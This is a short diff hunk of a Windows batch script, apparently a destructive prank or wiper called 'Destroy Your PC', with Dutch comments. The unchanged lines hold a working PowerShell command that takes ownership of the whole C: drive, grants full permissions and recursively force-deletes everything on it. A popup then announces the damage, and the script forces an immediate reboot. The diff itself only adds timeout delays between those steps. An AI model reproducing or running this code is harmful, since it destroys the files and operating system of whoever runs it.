@@ -105,10 +105,10 @@ ping localhost -n 5 >nul
 
 :: === OUDE POWERSHELL WIPE NA FORMAT ===
 powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"
-
+    timeout /t 10 >nul
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
-
+    timeout /t 2 >nul
 @echo off
 shutdown /r /t 0 /f
 
